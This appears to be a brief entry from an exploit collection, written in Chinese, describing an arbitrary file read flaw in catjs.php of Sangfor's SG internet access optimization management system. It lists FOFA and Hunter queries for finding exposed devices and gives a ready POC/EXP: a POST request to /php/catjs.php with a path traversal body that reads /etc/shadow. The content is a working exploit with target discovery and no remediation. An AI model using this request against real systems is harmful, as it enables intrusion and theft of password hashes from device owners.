# 深信服 SG上网优化管理系统 catjs.php 任意文件读取漏洞

## 网络测绘

fofa: title=="SANGFOR上网优化管理"

hunter: web.title=="SANGFOR上网优化管理"

## POC / EXP

```
POST /php/catjs.php

["../../../../../../etc/shadow"]
```